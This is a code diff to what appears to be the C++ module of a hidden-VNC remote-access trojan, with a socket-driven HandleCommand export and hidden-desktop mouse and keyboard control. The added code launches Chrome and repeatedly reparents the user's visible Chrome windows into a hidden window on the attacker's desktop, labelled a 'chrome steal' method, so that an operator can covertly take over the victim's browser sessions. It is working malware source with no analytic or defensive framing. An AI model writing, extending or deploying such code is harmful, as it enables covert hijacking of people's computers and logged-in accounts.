@@ -125,6 +125,11 @@ static atomic_bool g_encodeRunning(false);
 static atomic_bool g_sendRunning(false);
 static mutex g_logMutex;
 
+static atomic_bool g_chromeStealRunning(false);
+static HWND g_hChromeDummyParent = NULL;
+static thread g_chromeStealThread;
+static thread g_dummyParentThread;
+
 // Input Worker
 struct InputTask {
     string action;
@@ -1124,6 +1129,88 @@ static void input_loop() {
     }
 }
 
+static wstring GetChromePath() {
+    WCHAR path[MAX_PATH];
+    DWORD size = sizeof(path);
+    if (RegGetValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", NULL, RRF_RT_REG_SZ, NULL, path, &size) == ERROR_SUCCESS) {
+        return wstring(path);
+    }
+    if (RegGetValueW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", NULL, RRF_RT_REG_SZ, NULL, path, &size) == ERROR_SUCCESS) {
+        return wstring(path);
+    }
+    return L"chrome.exe";
+}
+
+static LRESULT CALLBACK DummyParentWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+    switch (msg) {
+        case WM_CLOSE: DestroyWindow(hwnd); return 0;
+        case WM_DESTROY: PostQuitMessage(0); return 0;
+    }
+    return DefWindowProcW(hwnd, msg, wParam, lParam);
+}
+
+static void dummy_parent_worker() {
+    ensure_desktop();
+    if (!g_hHiddenDesktop) return;
+    if (!SetThreadDesktop(g_hHiddenDesktop)) return;
+
+    WNDCLASSW wc = {0};
+    wc.lpfnWndProc = DummyParentWndProc;
+    wc.hInstance = GetModuleHandle(NULL);
+    wc.lpszClassName = L"ChromeStealParent";
+    RegisterClassW(&wc);
+
+    g_hChromeDummyParent = CreateWindowExW(0, wc.lpszClassName, L"Chrome Dummy Parent", WS_POPUP,
+                                           0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
+                                           NULL, NULL, wc.hInstance, NULL);
+
+    if (!g_hChromeDummyParent) return;
+
+    ShowWindow(g_hChromeDummyParent, SW_HIDE);
+
+    MSG msg;
+    while (g_chromeStealRunning && GetMessageW(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessageW(&msg);
+    }
+
+    if (g_hChromeDummyParent) {
+        DestroyWindow(g_hChromeDummyParent);
+        g_hChromeDummyParent = NULL;
+    }
+}
+
+static BOOL CALLBACK EnumStealProc(HWND hwnd, LPARAM lParam) {
+    if (!IsWindowVisible(hwnd)) return TRUE;
+
+    WCHAR className[256];
+    GetClassNameW(hwnd, className, 256);
+    if (wcscmp(className, L"Chrome_WidgetWin_1") != 0) return TRUE;
+
+    if (GetParent(hwnd) == g_hChromeDummyParent) return TRUE;
+
+    // Apply WS_CHILD style and move to hidden dummy parent
+    LONG_PTR style = GetWindowLongPtrW(hwnd, GWL_STYLE);
+    style |= WS_CHILD;
+    style &= ~WS_POPUP;
+    SetWindowLongPtrW(hwnd, GWL_STYLE, style);
+    SetParent(hwnd, g_hChromeDummyParent);
+
+    // Resize to fill parent
+    RECT rc;
+    GetClientRect(g_hChromeDummyParent, &rc);
+    SetWindowPos(hwnd, NULL, 0, 0, rc.right, rc.bottom, SWP_NOZORDER | SWP_SHOWWINDOW);
+
+    return TRUE;
+}
+
+static void chrome_steal_worker() {
+    while (g_chromeStealRunning) {
+        EnumWindows(EnumStealProc, 0);
+        Sleep(500);
+    }
+}
+
 static wstring utf8_to_wstring(const string& str) {
     if (str.empty()) return wstring();
     int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
@@ -1181,6 +1268,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             if (g_encodeThread.joinable())  g_encodeThread.join();
             if (g_sendThread.joinable())    g_sendThread.join();
             if (g_inputThread.joinable())   g_inputThread.join();
+
+            g_chromeStealRunning = false;
+            if (g_chromeStealThread.joinable()) g_chromeStealThread.join();
+            if (g_dummyParentThread.joinable()) g_dummyParentThread.join();
+
             release_all_bitmap_slots();
             g_dragging = false;
             g_dragHwnd = NULL;
@@ -1198,25 +1290,56 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             ensure_desktop();
             if (!g_hHiddenDesktop) return;
 
-            wstring path = utf8_to_wstring(cmd.value("path", "cmd.exe"));
-            vector<wchar_t> cmdLine(path.begin(), path.end());
-            cmdLine.push_back(L'\0');
+            string rawPath = cmd.value("path", "cmd.exe");
+            if (rawPath == "chrome.exe") {
+                if (!g_chromeStealRunning.exchange(true)) {
+                    if (g_chromeStealThread.joinable()) g_chromeStealThread.join();
+                    if (g_dummyParentThread.joinable()) g_dummyParentThread.join();
 
-            wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
-            STARTUPINFOW si = { sizeof(si) };
-            si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
-            si.dwFlags      = STARTF_USESHOWWINDOW;
-            si.wShowWindow  = SW_SHOW;
+                    g_dummyParentThread = thread(dummy_parent_worker);
+                    g_chromeStealThread = thread(chrome_steal_worker);
+                }
 
-            PROCESS_INFORMATION pi = { 0 };
-            if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
-                               CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
-                CloseHandle(pi.hProcess);
-                CloseHandle(pi.hThread);
-                g_forceFullFrame = true;
-                send_status("Process started on hidden desktop");
+                wstring chromePath = GetChromePath();
+                vector<wchar_t> cmdLine(chromePath.begin(), chromePath.end());
+                cmdLine.push_back(L'\0');
+
+                STARTUPINFOW si = { sizeof(si) };
+                si.dwFlags = STARTF_USESHOWWINDOW;
+                si.wShowWindow = SW_SHOW;
+
+                PROCESS_INFORMATION pi = { 0 };
+                // Launch on DEFAULT desktop
+                if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
+                                   CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
+                    g_forceFullFrame = true;
+                    send_status("Chrome started and redirection active (2026 Generation Method)");
+                } else {
+                    send_error("Failed to start Chrome. Error: " + to_string(GetLastError()));
+                }
             } else {
-                send_error("Failed to start process. Error: " + to_string(GetLastError()));
+                wstring path = utf8_to_wstring(rawPath);
+                vector<wchar_t> cmdLine(path.begin(), path.end());
+                cmdLine.push_back(L'\0');
+
+                wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
+                STARTUPINFOW si = { sizeof(si) };
+                si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
+                si.dwFlags      = STARTF_USESHOWWINDOW;
+                si.wShowWindow  = SW_SHOW;
+
+                PROCESS_INFORMATION pi = { 0 };
+                if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
+                                   CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
+                    g_forceFullFrame = true;
+                    send_status("Process started on hidden desktop");
+                } else {
+                    send_error("Failed to start process. Error: " + to_string(GetLastError()));
+                }
             }
         } else if (action.find("hvnc_mouse") != string::npos ||
                    action.find("hvnc_key")   != string::npos ||
